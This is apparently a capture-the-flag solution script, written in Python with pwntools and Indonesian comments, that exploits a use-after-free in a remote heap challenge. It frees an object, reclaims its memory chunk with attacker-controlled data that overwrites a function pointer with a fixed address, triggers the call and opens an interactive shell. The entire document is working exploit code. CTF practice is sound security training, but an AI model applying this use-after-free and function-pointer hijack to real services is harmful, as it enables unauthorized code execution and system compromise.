from pwn import *

context.log_level = 'error'
HOST = '0agn86asl3d2.boroctf.com'
PORT = 44996

def solve():
    io = remote(HOST, PORT)

    # 1. Alokasikan Real Person (Chunk size 0x48)
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Enter firstName: ", b"A")
    io.sendlineafter(b"Enter lastName: ", b"B")

    # 2. Free objek tanpa membersihkan pointer (Use-After-Free)
    io.sendlineafter(b"> ", b"4")

    # 3. Alokasikan Imaginary Friend untuk menduduki chunk memori yang sama
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Enter title: ", b"Nattt")

    # Offset dari special_ability menuju pointer fungsi 'conversate' adalah 24 byte
    # Alamat idealConversation = 0x00401731
    payload = b"A" * 24 + p64(0x00401731)
    io.sendlineafter(b"Enter special ability: ", payload)
    io.sendlineafter(b"Enter rating: ", b"5.0")

    # 4. Pemicu eksekusi function pointer yang telah dimodifikasi
    io.sendlineafter(b"> ", b"5")

    # Pindah ke mode interaktif shell
    io.interactive()

if __name__ == "__main__":
    solve()
